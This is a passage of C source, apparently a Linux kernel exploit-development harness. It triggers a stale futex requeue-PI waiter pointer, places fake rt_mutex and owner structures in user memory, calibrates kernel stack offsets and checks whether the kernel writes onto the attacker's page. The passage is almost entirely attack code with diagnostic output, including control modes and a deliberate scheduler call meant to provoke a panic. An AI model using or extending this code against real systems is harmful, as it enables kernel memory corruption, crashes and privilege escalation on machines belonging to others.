        fake_waiter2 = mmap(0, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (fake_waiter2 == MAP_FAILED) {
            printf("P0 ABORT mmap waiter2 failed\n");
            return 3;
        }
        mlock(fake_waiter2, 4096);
    }
    memset(win, 0, sizeof(win));
    setup_fake();

    if (g_mode >= 4) {
        /* STAMP_POLL needs one valid fd with a poll op so __pollwait queues
         * entry0 (entry0.key -> waiter->lock). pipe is enough, timeout=0 so
         * no sleep. Created before threads; waiter only uses g_pipe[0]. */
        if (pipe(g_pipe)) {
            printf("P0 ABORT pipe failed errno=%d\n", errno);
            return 3;
        }
    }

    printf("P0 READY var=%c mode=%s pad=0x%llx fake=%p owner=%p waiter2=%p win=%p pipe=%d,%d\n",
           g_var, mode_name(g_mode),
           (unsigned long long)g_pad, fake, fake_owner, fake_waiter2, win,
           g_pipe[0], g_pipe[1]);
    printf("P0 fake: +0x08=%#llx +0x10=%#llx +0x18=%#llx\n",
           (unsigned long long)fake8[LOCK_WAITERS / 8],
           (unsigned long long)fake8[LOCK_LEFTMOST / 8],
           (unsigned long long)fake8[LOCK_OWNER / 8]);

    /* O1/O2: occ waits for occ_go (set after O holds f_target), so the
     * thread order below does not matter and the trio still arms normally. */
    if (g_mode == 17 || g_mode == 18) {
        if (pthread_create(&occ, 0, occ_fn, 0) ||
            pthread_create(&occ2, 0, occ_fn, (void *)1)) {
            printf("P0 ABORT pthread_create occ2 failed\n");
            return 3;
        }
    }
    if (g_alt) {
        /* f_alt holder + 1 parked waiter: created before the trio so A
         * holds f_alt while W/O arm normally. alt_occ waits for alt_go. */
        if (pthread_create(&alto, 0, alt_owner_fn, 0) ||
            pthread_create(&altocc, 0, alt_occ_fn, 0)) {
            printf("P0 ABORT pthread_create alt failed\n");
            return 3;
        }
    }
    if (g_mode == 15 || g_mode == 19) {
        if (pthread_create(&occ, 0, occ_fn, 0)) {
            printf("P0 ABORT pthread_create occ failed\n");
            return 3;
        }
    }
    if (g_mode == 16) {
        if (pthread_create(&occ, 0, occ_fn, 0)) {
            printf("P0 ABORT pthread_create occ failed\n");
            return 3;
        }
    }
    if (pthread_create(&w, 0, waiter_fn, 0) ||
        pthread_create(&o, 0, owner_fn, 0) ||
        pthread_create(&c, 0, consumer_fn, 0)) {
        printf("P0 ABORT pthread_create failed\n");
        return 3;
    }

    spins = 0;
    while ((!w_armed || !o_started) && spins++ < 3000)
        usleep(10000);
    if (!w_armed || !o_started) {
        printf("P0 ABORT trio did not arm\n");
        return 2;
    }
    if (g_alt) {
        spins = 0;
        while (!a_armed && spins++ < 3000)
            usleep(10000);
        if (!a_armed) {
            printf("P0 ABORT alt owner did not arm\n");
            return 2;
        }
    }
    usleep(300000);

    if (g_mode >= 15 && g_mode <= 18) {
        occ_go = 1;   /* O holds f_target now; park occ thread(s) on it */
        usleep(300000);
        if (g_occ_n == 2)
            usleep(300000); /* 2nd waiter enqueues after the 1st */
    }
    if (g_mode == 19) {
        occ_go = 1;
        alt_go = 1;   /* A holds f_alt; park alt waiter + occ waiter */
        usleep(300000);
    }
    if (g_mode == 20 || g_mode == 21 || g_mode == 22) {
        alt_go = 1;   /* f_target untouched (occ_n=0); only f_alt occupied */
        usleep(300000);
    }

    if ((g_mode >= 15 && g_mode <= 18) || g_mode == 19) {
        /* O1/O2 occupancy matrix: 4th/5th thread parked on f_target, so
         * f_target.pi_mutex has N live waiters when the stale walk reaches
         * rt_mutex_top_waiter() on it. Ordinary PI usage, no injected data.
         *
         * occ_base/occ2_base are CONTROLS: same occupied graph, NO requeue,
         * so W->pi_blocked_on is NULL. Must time out; EDEADLK there would
         * prove the occupied f_target alone creates the cycle. */
        if (g_mode == 16 || g_mode == 18) {
            printf("P1 TRIGGER_SKIPPED occupied_f_target_no_requeue (CONTROL occ_n=%d)\n",
                   g_occ_n);
            printf("P2 BASELINE errno=n/a (no trigger)\n");
        } else {
            printf("P1 TRIGGER_ENTER cmp_requeue_pi f_wait->f_target (f_target occupied)\n");
            errno = 0;
            xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
            printf("P2 EDEADLK errno=%d (%s)%s\n", errno, strerror(errno),
                   errno == EDEADLK ? "" : " NOT_THE_TRIGGER");
            if (errno != EDEADLK)
                return 2;
        }
        cmp_done = 1;
        errno = 0;
        xfutex(&f_wait, FWAKE, 1, 0, 0, 0);
        printf("P3 GRAPH_%s occ_n=%d occupied=%d occ2_parked=%d fwake_errno=%d\n",
               (g_mode == 16 || g_mode == 18) ? "BASELINE" : "PRESERVED",
               g_occ_n, f_target_occupied,
               __atomic_load_n(&occ2_parked, __ATOMIC_ACQUIRE), errno);
    } else if (g_mode == 14) {
        /* POSITIVE CONTROL: no trigger at all. Wait for the arming EDEADLK. */
        spins = 0;
        while (!w_back && spins++ < 3000)
            usleep(10000);
        printf("P1 POSITIVE_CONTROL_ARMED w_back=%d (O already printed its LOCK_PI result)\n",
               w_back);
        printf("P2 CONSUMER_SKIPPED the walk already ran during arming\n");
        printf("P3 GRAPH_STANDS cycle W->f_target->f_chain intact\n");
    } else if (g_mode == 8 || g_mode == 11 || g_mode == 21) {
        /* CONTROL A baseline / CASE C target control / alt_base: same
         * arming, NO CMP_REQUEUE trigger, so no stale pointer can exist.
         * stale pointer can exist. Park waiter the same way, then timed
         * consumer on f_chain (owner W holds). Expect ETIMEDOUT. alt_base
         * consumes f_alt (owner A holds) instead. Expect ETIMEDOUT. */
        printf("P1 TRIGGER_SKIPPED baseline_no_requeue\n");
        printf("P2 BASELINE errno=n/a (no trigger)\n");
        cmp_done = 1;
        xfutex(&f_wait, FWAKE, 1, 0, 0, 0);
        printf("P3 GRAPH_BASELINE no_trigger waiter_parked owner_blocked\n");
    } else {
        printf("P1 TRIGGER_ENTER cmp_requeue_pi f_wait->f_target\n");
        errno = 0;
        xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
        printf("P2 EDEADLK errno=%d (%s)%s\n", errno, strerror(errno),
               errno == EDEADLK ? "" : " NOT_THE_TRIGGER");
        if (errno != EDEADLK)
            return 2;

        /* Preserve graph: no FUPI(f_chain), no unlock, no join.
         *
         * The FWAKE is REQUIRED and it does NOT wake W: futex_wake() refuses
         * a PI futex, this->rt_waiter is set, so it returns -EINVAL and W
         * stays blocked in futex_wait_queue_me with its FWRQ frame ALIVE.
         * That frame is where rt_waiter lives and where W->pi_blocked_on
         * still points. Waking W would destroy the object under test. */
        cmp_done = 1;
        errno = 0;
        xfutex(&f_wait, FWAKE, 1, 0, 0, 0);
        printf("P3 GRAPH_PRESERVED no_teardown waiter_keeps_f_chain owner_blocked fwrq_alive=%d fwake_errno=%d\n",
               g_inwin, errno);
    }

    if (g_mode == 14) {
        printf("P6 POSITIVE_CONTROL_VERDICT see P0 line: EDEADLK expected, "
               "anything else means the walk path is not understood\n");
        return 0;
    }

    if (g_inwin) {
        printf("P4 NO_STAMP in_window sp_futex=%#llx waiter_est_lab=%#llx (NOT a stock offset)\n",
               (unsigned long long)sp_futex,
               (unsigned long long)(sp_futex - WAITER_OFF_SP));
        printf("P4 OCCUPANCY_ARMED occ_n=%d occ2_parked=%d\n",
               g_occ_n, __atomic_load_n(&occ2_parked, __ATOMIC_ACQUIRE));
        if (g_alt)
            printf("P4 ALT_ARMED a_armed=%d alt_go=%d alt_parked=%d f_alt=%u\n",
                   a_armed, alt_go,
                   __atomic_load_n(&alt_parked, __ATOMIC_ACQUIRE), f_alt);
        if (g_mode == 14)
            printf("P4 CYCLE_VALUES f_chain=%u f_target=%u (expect nonzero TIDs + 0x80000000 WAITERS)\n",
                   f_chain, f_target);
        consumer_in = 1;
        printf("P5 LOCK_PI_ENTER var=%c mode=%s target=%s timeout_abs3s in_window\n",
               g_var, mode_name(g_mode), g_sel == 't' ? "f_target" :
               g_sel == 'x' ? "f_ctrl" : g_sel == 'a' ? "f_alt" : "f_chain");
        spins = 0;
        while (!__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE) && spins++ < 800)
            usleep(10000);
        usleep(200000);
        if (__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
            printf("P5 LOCK_PI_DONE rc=%ld errno=%d (%s) elapsed_ms=%llu\n",
                   consumer_rc, consumer_errno, strerror(consumer_errno),
                   (unsigned long long)g_consumer_ms);
        else
            printf("P5 LOCK_PI_PENDING entered=%d\n",
                   __atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE));
        if (g_second) {
            spins = 0;
            while (!__atomic_load_n(&c2_done, __ATOMIC_ACQUIRE) && spins++ < 800)
                usleep(10000);
            if (__atomic_load_n(&c2_done, __ATOMIC_ACQUIRE))
                printf("P5b LOCK_PI_TARGET_DONE rc=%ld errno=%d (%s) elapsed_ms=%llu\n",
                       c2_rc, c2_errno, strerror(c2_errno),
                       (unsigned long long)c2_ms);
            else
                printf("P5b LOCK_PI_TARGET_PENDING\n");
        }
        printf("P6 RESULT=%s mode=%s target=%s in_window done=%d rc=%ld errno=%d elapsed_ms=%llu\n",
               consumer_errno == EDEADLK ? "EDEADLK_CYCLE" :
               consumer_errno == ETIMEDOUT ? "TIMEOUT_BLOCK" :
               consumer_rc == 0 && consumer_errno == 0 ? "ACQUIRED" :
               !__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE) ? "PENDING" : "RETURNED_OTHER",
               mode_name(g_mode), g_sel == 't' ? "f_target" :
               g_sel == 'x' ? "f_ctrl" : g_sel == 'a' ? "f_alt" : "f_chain",
               __atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE),
               consumer_rc, consumer_errno,
               (unsigned long long)g_consumer_ms);
        printf("P7 TARGET_STATE occ_n=%d f_target_occupied=%d occ2_parked=%d alt_parked=%d consumer_errno=%d elapsed_ms=%llu\n",
               g_occ_n, f_target_occupied,
               __atomic_load_n(&occ2_parked, __ATOMIC_ACQUIRE),
               __atomic_load_n(&alt_parked, __ATOMIC_ACQUIRE),
               consumer_errno, (unsigned long long)g_consumer_ms);
        printf("P8 END mode=%s\n", mode_name(g_mode));
        return consumer_rc == 0 ? 0 : 1;
    }

    if (g_mode == 2 || g_mode == 3 || g_mode >= 8) {
        spins = 0;
        while (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE) && spins++ < 3000)
            usleep(10000);
        printf("P4 STAMP_SKIPPED %s natural_bytes_only sp_futex=%#llx waiter_est=%#llx page_off=%#llx\n",
               mode_name(g_mode),
               (unsigned long long)sp_futex,
               (unsigned long long)(sp_futex - WAITER_OFF_SP),
               (unsigned long long)((sp_futex - WAITER_OFF_SP) & 0x3fff));
    } else if (g_mode >= 4) {
        /* STAMP_POLL: one shot, no fixed point. Kernel frames are fixed so
         * pad must NOT matter: table base = SP0-0x2b0 = waiter for any pad.
         * If consumer behavior is pad-independent but VAR-dependent
         * (pollA vs pollB fault addr), reach is proven. If pad-dependent,
         * the model is wrong. dist==pad is still expected (tautology check)
         * but carries no kernel information. */
        spins = 0;
        while (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE) && spins++ < 3000)
            usleep(10000);
        if (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE)) {
            printf("P4 ABORT poll waiter never published SP\n");
            return 2;
        }
        {
            int ev = (g_mode == 5 || g_mode == 7) ? POLL_EV_B : POLL_EV_A;
            unsigned long key = (unsigned long)(uint16_t)ev | 0x18;
            printf("P4 STAMP_POLL mode=%s pad=%#llx sp_futex=%#llx sp_poll=%#llx dist=%#llx waiter_est=%#llx page_off=%#llx ev=0x%x key=0x%lx table==waiter binary\n",
                   g_mode == 4 ? "pollA" : g_mode == 5 ? "pollB" : g_mode == 6 ? "schedA" : "schedB",
                   (unsigned long long)g_pad,
                   (unsigned long long)sp_futex, (unsigned long long)sp_pub,
                   (unsigned long long)(sp_futex > sp_pub ? sp_futex - sp_pub : sp_pub - sp_futex),
                   (unsigned long long)(sp_futex - WAITER_OFF_SP),
                   (unsigned long long)((sp_futex - WAITER_OFF_SP) & 0x3fff),
                   ev, key);
            printf("P4 POLL_PREDICT lock_slot=table+0x38=key=0x%lx prio_slot=table+0x40=0 entries_miss_by_4B\n", key);
        }
    } else {
        for (attempt = 0; attempt < 4; attempt++) {
            uint64_t pad, fix;

            spins = 0;
            while (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE) && spins++ < 3000)
                usleep(10000);
            if (!__atomic_load_n(&g_pub, __ATOMIC_ACQUIRE)) {
                printf("P4 ABORT waiter never published SP\n");
                __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
                __atomic_store_n(&g_stop, 1, __ATOMIC_RELEASE);
                return 2;
            }
            pad = g_pad;
            fix = pad + sp_futex - sp_pub + (uint64_t)(FD_OFF - WAITER_OFF_SP);
            printf("P4 CAL attempt=%d pad=%#llx sp_futex=%#llx sp_psel=%#llx implied_pad=%#llx waiter_est=%#llx page_off=%#llx dist=%#llx\n",
                   attempt, (unsigned long long)pad,
                   (unsigned long long)sp_futex, (unsigned long long)sp_pub,
                   (unsigned long long)fix,
                   (unsigned long long)(sp_futex - WAITER_OFF_SP),
                   (unsigned long long)((sp_futex - WAITER_OFF_SP) & 0x3fff),
                   (unsigned long long)(sp_futex > sp_pub ? sp_futex - sp_pub : sp_pub - sp_futex));
            if (fix == pad) {
                __atomic_store_n(&g_stop, 1, __ATOMIC_RELEASE);
                __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
                break;
            }
            g_pad = fix;
            __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
        }
        if (!__atomic_load_n(&g_stop, __ATOMIC_ACQUIRE)) {
            printf("P4 ABORT no fixed point in 4 attempts\n");
            __atomic_store_n(&g_stop, 1, __ATOMIC_RELEASE);
            __atomic_fetch_add(&g_turn, 1, __ATOMIC_RELEASE);
            return 2;
        }
        printf("P4 STAMP_DONE pad=%#llx task_off=+0x30 lock=+0x38 prio=+0x40 win=%p fake=%p\n",
               (unsigned long long)g_pad, (void *)&win[0], fake);
    }

    spins = 0;
    while (!w_back && spins++ < 3000)
        usleep(10000);
    if (!w_back) {
        printf("P4 ABORT waiter did not park\n");
        return 2;
    }
    /* Re-apply VAR after calibration stamps so the final window holds the
     * variant bytes, not calibration pattern. Waiter is parked (no syscall)
     * so its stack is untouched from here on. */
    setup_fake();
    /* win[] is user memory: rewrite is safe, kernel already copied it. */
    fill_win();
    if (g_mode >= 4 && g_mode <= 7)
        fill_poll(); /* restore pollfd bytes for report (kernel copy done) */
    if (g_mode >= 4 && g_mode <= 7)
        printf("P4 FINAL var=%c mode=%s fake_before +0x08=%#llx +0x10=%#llx +0x18=%#llx pollfd0 fd=%d ev=0x%x\n",
               g_var, mode_name(g_mode),
               (unsigned long long)fake8[LOCK_WAITERS / 8],
               (unsigned long long)fake8[LOCK_LEFTMOST / 8],
               (unsigned long long)fake8[LOCK_OWNER / 8],
               *(int *)&win[0], *(uint16_t *)&win[4]);
    else
        printf("P4 FINAL var=%c fake_before +0x08=%#llx +0x10=%#llx +0x18=%#llx waiter_prio=%u\n",
               g_var,
               (unsigned long long)fake8[LOCK_WAITERS / 8],
               (unsigned long long)fake8[LOCK_LEFTMOST / 8],
               (unsigned long long)fake8[LOCK_OWNER / 8],
               *(uint32_t *)&win[RTMW_PRIO]);

    if (g_mode == 1) {
        volatile uint64_t k = 0;
        uint64_t n = g_busy;
        printf("P4 BUSY spin=%llu\n", (unsigned long long)n);
        for (uint64_t i = 0; i < n; i++)
            k += i;
        __asm__ volatile("" :: "r"(k) : "memory");
    }

    /* Consumer: single FUTEX_LOCK_PI, prepared long ago. *_t modes use an
     * absolute 3s timeout so a naturally blocked consumer returns instead
     * of hanging the trial. */
    consumer_in = 1;
    printf("P5 LOCK_PI_ENTER var=%c mode=%s%s\n", g_var, mode_name(g_mode),
           g_mode >= 8 ? " timeout_abs3s" : "");

    spins = 0;
    while (!__atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE) && spins++ < 300)
        usleep(10000);
    if (g_mode >= 8) {
        /* Timed: EDEADLK lands fast (<1s), ETIMEDOUT in ~3s. Wait 8s max. */
        for (spins = 0; spins < 800; spins++) {
            if (__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
                break;
            usleep(10000);
        }
        usleep(200000);
    } else {
        /* Give the syscall time to walk. Poll user-owned words only. */
        for (spins = 0; spins < 300; spins++) {
            if (__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
                break;
            if (fake8[LOCK_WAITERS / 8] || fake8[LOCK_LEFTMOST / 8])
                break;
            usleep(10000);
        }
        /* Drain a bit more so a slow walk can finish its stores. */
        usleep(200000);
    }

    if (__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
        printf("P5 LOCK_PI_DONE rc=%ld errno=%d (%s) elapsed_ms=%llu\n",
               consumer_rc, consumer_errno, strerror(consumer_errno),
               (unsigned long long)(g_mode >= 8 ? g_consumer_ms : 0));
    else
        printf("P5 LOCK_PI_PENDING entered=%d (no return yet: BLOCKED in slowlock sleep or in walk; PENDING alone proves neither)\n",
               __atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE));

    if ((g_mode == 6 || g_mode == 7) &&
        !__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE)) {
        /* MIN_CHAINWALK tiebreaker: sched_setscheduler(waiter) runs
         * __sched_setscheduler(pi=true) -> rt_mutex_adjust_pi(waiter),
         * which reads stale waiter->lock and trylocks it. Panic here
         * proves stale non-NULL + reach; silence keeps both hypotheses. */
        struct sched_param sp = { 0 };
        int r;

        printf("P5b SETSCHED_ENTER tid=%d\n", w_tid);
        errno = 0;
        r = sched_setscheduler(w_tid, SCHED_OTHER, &sp);
        printf("P5b SETSCHED_DONE rc=%d errno=%d (%s)\n", r, errno,
               strerror(errno));
        usleep(500000);
        if (__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
            printf("P5c CONSUMER_WOKE rc=%ld errno=%d\n", consumer_rc,
                   consumer_errno);
        else
            printf("P5c CONSUMER_STILL_PENDING\n");
    }

    {
        uint64_t w08 = fake8[LOCK_WAITERS / 8];
        uint64_t l10 = fake8[LOCK_LEFTMOST / 8];
        uint64_t ow = fake8[LOCK_OWNER / 8];
        const char *v;
        if (g_mode >= 8 && __atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE)) {
            /* Timed verdicts: return code is the discriminator, not hang.
             * EDEADLK fast = walk consumed stale waiter, found W->O->W
             * cycle (H1 evidence). ETIMEDOUT ~3s = consumer slept the full
             * timeout with no cycle detected (normal block OR walk bailed
             * before EDEADLK: NULL stale, lock mismatch, owner checks).
             * 0 = lock acquired (only sane for ctrl_t on f_ctrl). */
            if (consumer_errno == EDEADLK)
                v = "EDEADLK_CYCLE";
            else if (consumer_errno == ETIMEDOUT)
                v = "TIMEOUT_BLOCK";
            else if (consumer_rc == 0 && consumer_errno == 0)
                v = "ACQUIRED";
            else if (l10 && l10 == (uint64_t)(uintptr_t)win)
                v = "HIT_ENQUEUE";
            else if (l10 || w08)
                v = "HIT_OTHER_WRITE";
            else
                v = "RETURNED_NOWRITE";
        } else if (l10 && l10 == (uint64_t)(uintptr_t)win)
            v = "HIT_ENQUEUE";
        else if (l10 || w08)
            v = "HIT_OTHER_WRITE";
        else if (!__atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE))
            v = "MISS_NO_ENTER";
        else if (!__atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE))
            v = "HANG_IN_WALK";
        else
            v = "MISS_RETURNED_NOWRITE";
        printf("P6 RESULT=%s var=%c mode=%s pad=0x%llx waiters=%#llx leftmost=%#llx owner=%#llx entered=%d done=%d rc=%ld errno=%d elapsed_ms=%llu\n",
               v, g_var, mode_name(g_mode), (unsigned long long)g_pad,
               (unsigned long long)w08, (unsigned long long)l10,
               (unsigned long long)ow,
               __atomic_load_n(&consumer_entered, __ATOMIC_ACQUIRE),
               __atomic_load_n(&consumer_done, __ATOMIC_ACQUIRE),
               consumer_rc, consumer_errno,
               (unsigned long long)(g_mode >= 8 ? g_consumer_ms : 0));
        if (g_var == 'C' || g_var == 'D')
            printf("P6 OWNER_PAGE +0x28=%#llx +0x7f0=%#llx\n",
                   (unsigned long long)fake_owner8[OWNER_USAGE_OFF / 8],
                   (unsigned long long)*(uint64_t *)((char *)fake_owner + OWNER_PIBLOCKED));
        printf("P6 HINT HIT_ENQUEUE leftmost==&win means rt_mutex_enqueue ran on our page.\n");
        /* exit code 0 only on exact enqueue hit */
        return (l10 == (uint64_t)(uintptr_t)win) ? 0 : 1;
    }
}
